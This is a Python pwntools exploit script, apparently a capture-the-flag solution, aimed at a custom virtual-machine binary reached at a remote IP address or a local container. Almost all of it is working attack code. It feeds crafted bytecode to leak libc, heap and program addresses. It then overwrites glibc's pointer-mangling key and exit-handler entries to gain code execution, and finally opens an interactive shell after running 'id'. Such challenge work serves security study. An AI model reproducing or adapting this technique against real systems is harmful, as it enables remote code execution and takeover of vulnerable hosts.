#!/usr/bin/env python2
from pwn import *
import re

context.terminal = ["tmux", "split", "-h"]

data = open("./app").read()

jmp_table = data[0x0000000000051CA0:0x0000000000051CA0+149*8]
opcodes = [u64(jmp_table[i:i+8]) for i in range(0, len(jmp_table), 8)]
breakpoints = "\n".join(["b* 0x{:x}".format(addr+0x555555554000) for addr in opcodes])

if "remote" in os.environ:
    p = remote("58.229.185.61", 10001)
else:
    # p = process("./app")
    p = remote("172.17.0.2", 1234)

# gdb.attach(p, """
# # set $str=0x7ffff7f5a000
# # set $vm=0x7ffff7fba038
# # set $mem=0x5555555d6000
# # b set_register
# # b get_register
# # b set_memory
# # b get_memory
# # b syscall
# """)

dummy = 0x11
def x(opcode, op1=dummy, op2=dummy):
    res = chr(opcode) + chr(op1) + chr(op2)
    return res

set_reg = 0
get_reg = 1
get_memory = 9
set_memory = 12
gm_sr = 11
gr_sr = 16
# gr_gm = 8     # XX M[R[a0]]
gr_gr_sm = 14 # M[R[a0]] = (R[a1] >> 1)
syscall = 15 # R0 = 0: fileread, 1: reg print, 2: readint
gr_gm_sr = 10 # R0 = M[R[a0]]

vm = [
    # x(set_reg, 0, 0x80),
    # x(gr_gm_sr, 0),
    # x(gr_sr, 13, 0), # R13 = R0
    
    # x(set_reg, 0, 1), # print
    # x(syscall),
    
# libc & heap leak
    x(gm_sr, 0),     # main_arena+Xxx
    x(gr_sr, 13, 0), # R13 = R0
    x(gm_sr, 2),     # heap+xXX
    x(gr_sr, 12, 0), # R13 = R0
    
    x(set_reg, 0, 1), # print
    x(syscall),
    
# pie_base leak
    x(set_reg, 1, 11),
    x(set_reg, 0, 2),
    x(syscall),       # R11 = pointer to pie

    x(gr_gm_sr, 11), # R0 = M[R11]
    x(gr_sr, 14, 0), # R14 = R0
    x(set_reg, 0, 1), # print
    x(syscall),

# syscall leak
    x(set_reg, 1, 10),
    x(set_reg, 0, 2),
    x(syscall),       # R10 = pointer to syscall
    
    x(gr_gm_sr, 10), # R0 = M[R10]
    x(gr_sr, 15, 0), # R14 = R0
    x(set_reg, 0, 1), # print
    x(syscall),

# &syscall overwrite with oneshot -> not working
# fs_base overwrite with oneshot
    x(set_reg, 1, 8),
    x(set_reg, 0, 2),
    x(syscall),
    
    x(set_reg, 1, 9),
    x(set_reg, 0, 2),
    x(syscall),
    
    x(gr_gr_sm, 8, 9), # M[R[a0]] = R[a1] / 2

# exit_handler overwrite
    x(set_reg, 1, 14),
    x(set_reg, 0, 2),
    x(syscall),
    
    x(set_reg, 1, 15),
    x(set_reg, 0, 2),
    x(syscall),

    x(gr_gr_sm, 14, 15), # M[R[a0]] = R[a1] / 2
    
    x(set_reg, 1, 14),
    x(set_reg, 0, 2),
    x(syscall),
    
    x(set_reg, 1, 15),
    x(set_reg, 0, 2),
    x(syscall),

    x(gr_gr_sm, 14, 15), # M[R[a0]] = R[a1] / 2
    
    
    x(set_reg, 0, 1), # print
    x(syscall),
    
    x(set_reg, 0, 2), # print
    x(syscall),
]

payload = ''.join(vm).ljust(999, "\x00")
p.sendlineafter(":", payload)

info = p.recvuntil("R15:") + p.recvline()
_r12 = r"R12: (\d+)"
_r13 = r"R13: (\d+)"
_r14 = r"R14: (\d+)"
_r15 = r"R15: (\d+)"
r12 = int(re.search(_r12, info).group(1))
r13 = int(re.search(_r13, info).group(1))

heap_base = ((r12 * 4) - 0x16b40 + 4)
libc_base = ((r13 * 4) - 0x21a36c)
VM_MEM = heap_base + 0x16b50
print "heap", hex(heap_base)
print "libc", hex(libc_base)

target = libc_base + 0x218ea8
print "ptr to pie", hex(target)
print "VM_MEM", hex(VM_MEM)

p.sendline(str((target - VM_MEM) // 4 + 2))

info = p.recvuntil("R15:") + p.recvline()
r14 = int(re.search(_r14, info).group(1))
pie_base = r14 * 4 - 0x5323c
print "pie", hex(pie_base)

ptr_syscall = pie_base + 0x000000000052988
print "&syscall", hex(ptr_syscall)

p.sendline(str((ptr_syscall - VM_MEM) // 4))


info = p.recvuntil("R15:") + p.recvline()
r15 = int(re.search(_r15, info).group(1))
syscall = r15 * 4 + 4
oneshot = syscall + 0xca0
print "syscall", hex(syscall)
print "oneshot", hex(oneshot)

exit_handler = libc_base + 0x21af18
key = libc_base - 0x20d90
print "exit_handler", hex(exit_handler)
print "key", hex(key)

## 
p.sendline(str((key + 8 - VM_MEM) // 4))
sleep(0.1)
p.sendline(str((libc_base + 0x0000000000050d60 + 1) * 2))
sleep(0.1)

## 
p.sendline(str((exit_handler + 8 - VM_MEM) // 4))
sleep(0.1)
p.sendline(str(0))

p.sendline(str((exit_handler + 8 + 8 - VM_MEM) // 4))
sleep(0.1)
p.sendline(str(((libc_base + 0x1d8698) + 1) * 2))

p.recvline()
p.sendline("1")
p.recvline()
p.sendline("id")
p.interactive()
